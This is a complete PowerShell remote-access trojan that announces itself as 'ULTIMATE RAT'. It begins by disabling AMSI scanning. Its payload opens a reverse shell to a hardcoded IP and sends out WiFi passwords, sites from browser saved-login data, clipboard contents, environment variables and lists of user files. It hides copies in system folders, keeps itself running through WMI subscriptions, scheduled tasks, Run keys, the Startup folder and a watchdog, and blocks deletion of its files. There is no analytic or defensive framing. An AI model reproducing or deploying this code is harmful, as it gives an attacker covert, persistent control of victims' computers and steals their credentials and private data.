#Requires -RunAsAdministrator
[Ref].Assembly.GetTypes()|ForEach-Object{if($_.Name -like "*iUtils"){$_.GetFields('NonPublic,Static')|ForEach-Object{if($_.Name -like "*Context"){$_.SetValue($null,[IntPtr]::Zero)}}}}

$C2_IP="yourvpsiphere";$C2_PORT=4443;$F="windowsgui.ps1"

$payload=@'
while($true){try{
$c=New-Object System.Net.Sockets.TCPClient('152.53.38.5',4443)
$s=$c.GetStream();$w=New-Object IO.StreamWriter($s);$b=New-Object Byte[] 8192;$e=New-Object Text.AsciiEncoding

$w.WriteLine("="*100);$w.WriteLine("COMPLETE EXTRACTION | $(Get-Date) | $env:COMPUTERNAME | $env:USERNAME");$w.WriteLine("="*100);$w.Flush()

# WiFi Passwords
$w.WriteLine("`n[1] WIFI PASSWORDS");$w.WriteLine("-"*80)
(netsh wlan show profiles)|?{$_ -match "All User"}|%{$pn=($_ -split ":")[-1].Trim();$pk=(netsh wlan show profile name="$pn" key=clear|?{$_ -match "Key Content"});if($pk){$w.WriteLine("$pn = $(($pk -split ':')[-1].Trim())")}}
$w.Flush()

# Network Config
$w.WriteLine("`n[2] NETWORK CONFIG");$w.WriteLine("-"*80)
$w.WriteLine((ipconfig /all|Out-String));$w.Flush()

# Routing & ARP
$w.WriteLine("`n[3] ROUTING TABLE");$w.WriteLine((route print|Out-String));$w.Flush()
$w.WriteLine("`n[4] ARP CACHE");$w.WriteLine((arp -a|Out-String));$w.Flush()

# Active Connections
$w.WriteLine("`n[5] ACTIVE CONNECTIONS");$w.WriteLine((netstat -ano|Out-String));$w.Flush()

# System Info
$w.WriteLine("`n[6] SYSTEM INFO");$w.WriteLine((systeminfo|Out-String));$w.Flush()

# Browser Login Sites
$w.WriteLine("`n[7] BROWSER SAVED LOGINS")
@{Chrome="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data";Edge="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data";Brave="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default\Login Data"}.GetEnumerator()|%{
if(Test-Path $_.Value){$w.WriteLine("[$($_.Key)]");$t="$env:TEMP\$($_.Key)_t";cp $_.Value $t -Force -EA 0
if(Test-Path $t){$bytes=[IO.File]::ReadAllBytes($t);$text=[Text.Encoding]::UTF8.GetString($bytes)
[regex]::Matches($text,'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}')|Select -Expand Value -Unique|Select -First 20|%{$w.WriteLine("  $_")}
rm $t -Force -EA 0}}}
$w.Flush()

# Processes
$w.WriteLine("`n[8] TOP PROCESSES");$w.WriteLine((gps|sort CPU -Desc|select -First 20 Name,Id,CPU,WS|ft -a|Out-String));$w.Flush()

# Installed Programs
$w.WriteLine("`n[9] INSTALLED PROGRAMS")
$w.WriteLine((gp HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|?{$_.DisplayName}|select DisplayName,DisplayVersion -First 30|ft -a|Out-String));$w.Flush()

# User Accounts
$w.WriteLine("`n[10] LOCAL USERS");$w.WriteLine((Get-LocalUser|select Name,Enabled,LastLogon|ft -a|Out-String));$w.Flush()

# Clipboard
$w.WriteLine("`n[11] CLIPBOARD")
try{Add-Type -AssemblyName System.Windows.Forms;$cb=[Windows.Forms.Clipboard]::GetText();if($cb){$w.WriteLine($cb)}else{$w.WriteLine("Empty")}}catch{$w.WriteLine("N/A")}
$w.Flush()

# Recent Docs
$w.WriteLine("`n[12] RECENT DOCUMENTS")
$w.WriteLine((gci "$env:APPDATA\Microsoft\Windows\Recent" -EA 0|select -First 20 Name,LastWriteTime|ft -a|Out-String));$w.Flush()

# Startup Programs
$w.WriteLine("`n[13] STARTUP PROGRAMS")
$w.WriteLine("Registry:");(gp "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -EA 0).PSObject.Properties|?{$_.Name -notlike 'PS*'}|%{$w.WriteLine("  $($_.Name): $($_.Value)")}
$w.Flush()

# Shared Folders
$w.WriteLine("`n[14] SHARED FOLDERS")
$w.WriteLine((Get-SmbShare -EA 0|ft -a|Out-String));$w.Flush()

# USB Devices
$w.WriteLine("`n[15] USB DEVICES")
$w.WriteLine((Get-PnpDevice -Class USB -EA 0|?{$_.Status -eq 'OK'}|select FriendlyName|ft -a|Out-String));$w.Flush()

# Environment Variables
$w.WriteLine("`n[16] ENVIRONMENT VARS")
gci Env:|%{$w.WriteLine("$($_.Name)=$($_.Value)")};$w.Flush()

# Desktop Files
$w.WriteLine("`n[17] DESKTOP");$w.WriteLine((gci "$env:USERPROFILE\Desktop" -EA 0|select Name,LastWriteTime|ft -a|Out-String));$w.Flush()

# Documents
$w.WriteLine("`n[18] DOCUMENTS");$w.WriteLine((gci "$env:USERPROFILE\Documents" -EA 0|select -First 30 Name,LastWriteTime|ft -a|Out-String));$w.Flush()

# Downloads
$w.WriteLine("`n[19] DOWNLOADS");$w.WriteLine((gci "$env:USERPROFILE\Downloads" -EA 0|select -First 30 Name,LastWriteTime|ft -a|Out-String));$w.Flush()

$w.WriteLine("`n"+"="*100);$w.WriteLine("EXTRACTION COMPLETE | SHELL READY");$w.WriteLine("="*100+"`n");$w.Flush()

# Command Loop
while(($r=$s.Read($b,0,$b.Length))-gt 0){$cmd=$e.GetString($b,0,$r).Trim();if($cmd -eq 'exit'){break}
try{$o=iex $cmd 2>&1|Out-String;$w.WriteLine($o)}catch{$w.WriteLine("Error: $_")}
$w.Flush()}
$c.Close()
}catch{sleep 30}}
'@

# Install to 3 hidden locations
Write-Host "[*] Installing files..." -ForegroundColor Cyan
@("$env:SystemRoot\System32\$F","$env:ProgramData\Microsoft\Windows\$F","$env:SystemRoot\Tasks\$F")|%{
    New-Item -Path (Split-Path $_) -ItemType Directory -Force -EA 0|Out-Null
    $payload|Out-File $_ -Force
    attrib +h +s "$_"
}
Write-Host "[+] 3 hidden locations created" -ForegroundColor Green

# WMI Persistence
Write-Host "[*] Installing WMI persistence..." -ForegroundColor Cyan
gwmi -Namespace root\subscription -Class __EventFilter -Filter "Name='WGUI'" -EA 0|rwmi
gwmi -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WGUI'" -EA 0|rwmi
gwmi -Namespace root\subscription -Class __FilterToConsumerBinding -EA 0|?{$_.Consumer -like "*WGUI*"}|rwmi
$filt=swmi -Namespace root\subscription -Class __EventFilter -Arguments @{Name="WGUI";EventNamespace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 90 AND TargetInstance.SystemUpTime < 150"}
$cons=swmi -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name="WGUI";CommandLineTemplate="powershell.exe -NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\$F`""}
swmi -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filt;Consumer=$cons}|Out-Null
Write-Host "[+] WMI installed (survives disk imaging)" -ForegroundColor Green

# Scheduled Task
Write-Host "[*] Installing scheduled task..." -ForegroundColor Cyan
$act=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\$F`""
$trg=New-ScheduledTaskTrigger -AtStartup
$prn=New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$set=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
Register-ScheduledTask -TaskName "WindowsGUIService" -Action $act -Trigger $trg -Principal $prn -Settings $set -Force|Out-Null
Write-Host "[+] Scheduled task installed (SYSTEM level)" -ForegroundColor Green

# Registry Persistence
Write-Host "[*] Installing registry persistence..." -ForegroundColor Cyan
sp "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsGUI" -Value "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\$F`"" -Force
sp "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsGUI" -Value "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$env:ProgramData\Microsoft\Windows\$F`"" -Force
Write-Host "[+] Registry keys installed (HKLM + HKCU)" -ForegroundColor Green

# Startup Folder
cp "$env:SystemRoot\System32\$F" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$F" -Force
attrib +h "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$F"

# Watchdog
Write-Host "[*] Installing watchdog..." -ForegroundColor Cyan
$watchdog=@"
while(`$true){sleep 300
if(-not(Test-Path "$env:SystemRoot\System32\$F")){cp "$env:ProgramData\Microsoft\Windows\$F" "$env:SystemRoot\System32\$F" -Force}
`$r=gps powershell -EA 0|?{`$_.CommandLine -like "*$F*"}
if(-not `$r){start powershell -ArgumentList "-NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\$F`"" -WindowStyle Hidden}}
"@
$watchdog|Out-File "$env:SystemRoot\System32\watchdog_gui.ps1" -Force
attrib +h +s "$env:SystemRoot\System32\watchdog_gui.ps1"
$act=New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\watchdog_gui.ps1`""
Register-ScheduledTask -TaskName "SystemGUIWatchdog" -Action $act -Trigger (New-ScheduledTaskTrigger -AtStartup) -Principal $prn -Force|Out-Null
Write-Host "[+] Watchdog installed (auto-reinstalls if deleted)" -ForegroundColor Green

# File Protection
Write-Host "[*] Protecting files from deletion..." -ForegroundColor Cyan
@("$env:SystemRoot\System32\$F","$env:ProgramData\Microsoft\Windows\$F","$env:SystemRoot\Tasks\$F","$env:SystemRoot\System32\watchdog_gui.ps1")|%{
    takeown /f "$_" /a 2>$null|Out-Null
    icacls "$_" /deny Everyone:D 2>$null|Out-Null
}
Write-Host "[+] Files protected" -ForegroundColor Green

# Start Everything
Write-Host "[*] Starting RAT and watchdog..." -ForegroundColor Cyan
start powershell -ArgumentList "-NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\$F`"" -WindowStyle Hidden
start powershell -ArgumentList "-NoP -W Hidden -Exec Bypass -File `"$env:SystemRoot\System32\watchdog_gui.ps1`"" -WindowStyle Hidden

Write-Host "`n[SUCCESS] ULTIMATE RAT INSTALLED!" -ForegroundColor Green
Write-Host "[+] Extracts 19 data categories automatically" -ForegroundColor Cyan
Write-Host "[+] 5 persistence mechanisms (WMI+Task+Reg+Startup+Watchdog)" -ForegroundColor Cyan
Write-Host "[+] 3 hidden backup locations" -ForegroundColor Cyan
Write-Host "[+] Files protected from deletion" -ForegroundColor Cyan
Write-Host "[+] Survives: reboots, user switches, disk imaging" -ForegroundColor Cyan
Write-Host "[+] C2: $C2_IP`:$C2_PORT" -ForegroundColor Cyan
Write-Host "[+] Connecting now..." -ForegroundColor Cyan
